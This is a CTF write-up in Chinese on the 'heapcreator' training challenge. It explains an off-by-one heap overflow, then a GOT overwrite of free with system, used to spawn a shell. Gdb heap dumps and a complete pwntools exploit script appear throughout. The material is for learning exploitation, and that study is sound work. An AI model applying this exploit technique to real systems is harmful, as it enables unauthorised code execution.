---
title: hitcontraining_heapcreator(off_by_one学习)
description: hitcontraining_heapcreator(off_by_one学习)-writeup
date: 2021-08-12 15:07:56
categories:
 - PWN
tags:
---

# hitcontraining_heapcreator(off_by_one学习)

## IDA分析

典型菜单题

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628763276194-5eb9d19c-4e53-47b8-b053-58a9a11fc43b.png)

创建堆块

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628763308672-6d04568b-d687-4e92-9435-9315c0509562.png)

这里heaparray其实就是个一个结构体

![image-20220222141701109](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/image-20220222141701109.png)

编辑堆块，这里允许填写size+1个字节，存在溢出，考虑off_by_one

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628763557429-e63ee5ee-21b8-4a6d-96ad-d8f612a2d376.png)

打印size和content

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628763639613-85fbe0b4-a26f-4d10-8aac-141cac7d5226.png)

free堆块

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628763667187-531ee658-dcd5-40da-a27a-dbca9c8941f6.png)

## 调试分析

我们知道chunk的prev_size位在前一个chunk不是free chunk的时候是作为存储前一个chunk的数据的，那我们申请一个0x18的chunk和一个0x10的chunk调试看看

```python
create(0x18,'a'*0x18) #idx0
create(0x10,'b'*0x10) #idx1
0x61c000:	0x0000000000000000	0x0000000000000021
0x61c010:	0x0000000000000018	0x000000000061c030 #chunk0的size和content指针
0x61c020:	0x0000000000000000	0x0000000000000021 #chunk0
0x61c030:	0x6161616161616161	0x6161616161616161 #aaaa.....
0x61c040:	0x6161616161616161	0x0000000000000021
0x61c050:	0x0000000000000010	0x000000000061c070 #chunk1的size和content指针
0x61c060:	0x0000000000000000	0x0000000000000021 #chunk1
0x61c070:	0x6262626262626262	0x6262626262626262 #bbbb.....
0x61c080:	0x0000000000000000	0x0000000000020f81 #top chunk
0x61c090:	0x0000000000000000	0x0000000000000000
```

可以看到chunk0的数据填满了存储size和content指针的chunk的prev_size位，记得刚刚的edit函数里有个off_by_one漏洞，这样就可以将下一个chunk的size位改了，具体利用看脚本

```python
create(0x18,'a'*0x18) #idx0
create(0x10,'b'*0x10) #idx1
create(0x10,'c'*0x10) #idx2
create(0x10,'/bin/sh\x00') #idx3
```

首先申请4个堆块，最后一个堆块写入/bin/sh\x00以便后面使用

```python
0x1d10000:	0x0000000000000000	0x0000000000000021 
0x1d10010:	0x0000000000000018	0x0000000001d10030 #chunk0的size和content指针
0x1d10020:	0x0000000000000000	0x0000000000000021 #chunk0
0x1d10030:	0x6161616161616161	0x6161616161616161 #aaaa....
0x1d10040:	0x6161616161616161	0x0000000000000021
0x1d10050:	0x0000000000000010	0x0000000001d10070 #chunk1的size和content指针
0x1d10060:	0x0000000000000000	0x0000000000000021 #chunk1
0x1d10070:	0x6262626262626262	0x6262626262626262 #bbbb....
0x1d10080:	0x0000000000000000	0x0000000000000021 
0x1d10090:	0x0000000000000010	0x0000000001d100b0 #chunk2的size和content指针
0x1d100a0:	0x0000000000000000	0x0000000000000021 #chunk1
0x1d100b0:	0x6363636363636363	0x6363636363636363 #cccc....
0x1d100c0:	0x0000000000000000	0x0000000000000021
0x1d100d0:	0x0000000000000010	0x0000000001d100f0 #chunk3的size和content指针
0x1d100e0:	0x0000000000000000	0x0000000000000021 #chunk3
0x1d100f0:	0x0068732f6e69622f	0x000000000000000a #/bin/sh\x00
0x1d10100:	0x0000000000000000	0x0000000000020f01 #top chunk
0x1d10110:	0x0000000000000000	0x0000000000000000
0x1d10120:	0x0000000000000000	0x0000000000000000
0x1d10130:	0x0000000000000000	0x0000000000000000
```

然后调用edit，通过修改chunk0的content溢出将下一个chunk的size位改成0x81，然后free，这样就后面通过申请0x70字节chunk就能申请回来了，而且content直接覆盖了后面几个chunk

```python
edit(0,'a'*0x18+p64(0x81))
delete(1)
create(0x70,'d'*0x40+p64(8)+p64(elf.got['free'])) #idx1
```

我们通过重新申请chunk1，将chunk2的content指针改成free的got地址

```python
0x24a3000:	0x0000000000000000	0x0000000000000021
0x24a3010:	0x0000000000000018	0x00000000024a3030 #chunk0的size和content指针
0x24a3020:	0x0000000000000000	0x0000000000000021 #chunk0
0x24a3030:	0x6161616161616161	0x6161616161616161 #aaaa....
0x24a3040:	0x6161616161616161	0x0000000000000081 #chunk1
0x24a3050:	0x6464646464646464	0x6464646464646464 #dddd....
0x24a3060:	0x6464646464646464	0x6464646464646464 #ddddd...
0x24a3070:	0x6464646464646464	0x6464646464646464
0x24a3080:	0x6464646464646464	0x6464646464646464
0x24a3090:	0x0000000000000008	0x0000000000602018 #chunk2的size和free_got地址
0x24a30a0:	0x000000000000000a	0x0000000000000021
0x24a30b0:	0x6363636363636363	0x6363636363636363
0x24a30c0:	0x0000000000000000	0x0000000000000021
0x24a30d0:	0x0000000000000010	0x00000000024a30f0
0x24a30e0:	0x0000000000000000	0x0000000000000021
0x24a30f0:	0x0068732f6e69622f	0x000000000000000a
0x24a3100:	0x0000000000000000	0x0000000000020f01
0x24a3110:	0x0000000000000000	0x0000000000000000
0x24a3120:	0x0000000000000000	0x0000000000000000
```

然后通过show(2)将free got中的地址打印出来就可以得到free的真实地址，然后算出libc base，然后得到system的地址，将system的地址写到free的got表，这样之后调用free函数的时候就变成调用system了

```python
show(2)
p.recvuntil('Content : ')
free_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
print(hex(free_addr))

libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
sys_addr = libc_base + libc.dump('system')

edit(2,p64(sys_addr))

delete(3)
```

最后free掉chunk3，本来是free(binsh的地址)变成system(binsh的地址)也就是system('/bin/sh')，这样就可以get shell了

## EXP

```python
from pwn import *
from LibcSearcher import *

# context.log_level = 'debug'
p = process('./heapcreator')
# p=remote("node4.buuoj.cn",28916)
elf=ELF('./heapcreator')

def create(length,value):
	p.recvuntil("Your choice :")
	p.sendline("1")
	p.recvuntil("Size of Heap : ")
	p.sendline(str(int(length)))
	p.recvuntil("Content of heap:")
	p.sendline(value)

def edit(index,value):
	p.recvuntil("Your choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(int(index)))
	p.recvuntil("Content of heap : ")
	p.sendline(value)

def show(index):
	p.recvuntil("Your choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(int(index)))

def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(int(index)))

create(0x18,'a'*0x18) #idx0
create(0x10,'b'*0x10) #idx1
create(0x10,'c'*0x10) #idx2
create(0x10,'/bin/sh\x00') #idx3
edit(0,'a'*0x18+p64(0x81))
delete(1)
create(0x70,'d'*0x40+p64(8)+p64(elf.got['free'])) #idx1
pause()
show(2)
p.recvuntil('Content : ')
free_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
print(hex(free_addr))

libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
sys_addr = libc_base + libc.dump('system')

edit(2,p64(sys_addr))

delete(3)
p.interactive()
```